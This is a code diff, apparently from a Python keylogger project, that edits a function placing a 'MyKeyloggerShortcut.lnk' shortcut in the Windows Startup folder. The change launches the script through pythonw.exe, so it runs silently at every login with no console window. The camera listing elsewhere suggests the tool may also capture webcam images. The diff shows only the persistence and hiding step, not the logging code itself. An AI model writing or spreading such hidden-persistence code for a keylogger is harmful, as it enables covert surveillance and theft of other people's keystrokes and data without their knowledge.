@@ -42,13 +42,16 @@ camlist = pygame.camera.list_cameras()
 def startup():
 
     script_path = os.path.abspath(sys.argv[0])
+    pythonw_path = os.path.join(sys.exec_prefix, "pythonw.exe")
+
        
     startup_folder = winshell.startup()
     shortcut_path = os.path.join(startup_folder, "MyKeyloggerShortcut.lnk")
 
     shell = Dispatch('WScript.Shell')
     shortcut = shell.CreateShortcut(shortcut_path)
-    shortcut.TargetPath = script_path
+    shortcut.TargetPath = pythonw_path
+    shortcut.Arguments = f'"{script_path}"'
     shortcut.WorkingDirectory = os.path.dirname(script_path)
     shortcut.IconLocation = script_path
     shortcut.save()
